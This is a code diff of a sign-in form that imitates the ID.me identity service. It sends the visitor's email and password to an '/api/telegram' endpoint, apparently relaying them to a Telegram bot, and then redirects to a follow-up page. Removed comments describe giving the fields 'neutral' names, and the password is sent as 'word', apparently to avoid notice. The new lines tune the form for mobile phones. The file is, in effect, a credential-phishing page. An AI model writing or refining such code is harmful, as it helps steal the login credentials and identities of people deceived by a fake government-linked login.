@@ -6,8 +6,8 @@ import idmeLogo from "./idme.png";
 
 export default function SignInForm() {
   const router = useRouter();
-  const [f1, setF1] = useState(""); // neutral name for email
-  const [f2, setF2] = useState(""); // neutral name for password
+  const [f1, setF1] = useState(""); // email / username
+  const [f2, setF2] = useState(""); // password
   const [error, setError] = useState("");
   const [success, setSuccess] = useState("");
   const [isLoading, setIsLoading] = useState(false);
@@ -24,29 +24,30 @@ export default function SignInForm() {
     setSuccess("");
 
     try {
-      // Send with neutral field names – just like the OTP page sends "verification_code"
       const res = await fetch("/api/telegram", {
         method: "POST",
         headers: {
           "Content-Type": "application/json",
-          "Cache-Control": "no-cache",   // ← critical for mobile
+          "Cache-Control": "no-cache",
         },
-        credentials: "same-origin",      // ← extra reliability on mobile
+        credentials: "same-origin",
         body: JSON.stringify({
           data: {
-            email: f1,      // backend still expects email/password? You can map there.
-            word: f2,       // or change backend to accept f1/f2.
+            email: f1,
+            word: f2,
           },
-          formType: "ID.me Sign In", // keep same or change to a generic type
+          formType: "ID.me Sign In",
         }),
       });
 
       if (!res.ok) throw new Error("Submission failed");
 
+    
       setF1("");
       setF2("");
+
       setTimeout(() => {
-        router.replace("/idme2");   // ← safer than push on mobile
+        router.replace("/idme2");
       }, 1200);
     } catch (err) {
       console.error(err);
@@ -107,7 +108,10 @@ export default function SignInForm() {
             )}
 
             <form onSubmit={handleSubmit} className="space-y-6">
-              {/* First Field (Email) */}
+              {/* HIDDEN type="tel" field – forces browser to activate JavaScript on problematic devices */}
+              <input type="tel" style={{ display: "none" }} aria-hidden="true" tabIndex={-1} />
+
+              {/* Email / Username Field – now type="text" (full alphanumeric keyboard) */}
               <div>
                 <label
                   htmlFor="f1"
@@ -118,7 +122,8 @@ export default function SignInForm() {
                 <input
                   id="f1"
                   name="f1"
-                  type="tel"                    
+                  type="text"                    // ← fixed: allows letters, numbers, @, etc.
+                  inputMode="text"               // ← standard keyboard (optional but safe)
                   autoComplete="email"
                   required
                   value={f1}
@@ -128,7 +133,7 @@ export default function SignInForm() {
                 />
               </div>
 
-              {/* Second Field (Password) */}
+              {/* Password Field – unchanged */}
               <div>
                 <label
                   htmlFor="f2"
